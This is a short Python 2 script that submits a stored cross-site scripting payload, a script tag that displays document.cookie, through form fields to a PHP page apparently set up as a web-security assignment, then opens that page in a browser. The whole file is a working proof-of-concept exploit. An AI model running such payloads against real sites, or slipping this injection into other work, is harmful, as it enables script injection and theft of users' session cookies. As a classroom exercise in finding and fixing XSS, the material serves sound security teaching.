import urllib, urllib2, cookielib, webbrowser, os

url = "http://www.wsb.com/Assignment2/case04.php"
values = dict(title="Exploit", content="Exploit... <script>alert(document.cookie)</script>")
data = urllib.urlencode(values)
req = urllib2.Request(url, data)
rsp = urllib2.urlopen(req)
content = rsp.read()

webbrowser.open(url, new=2)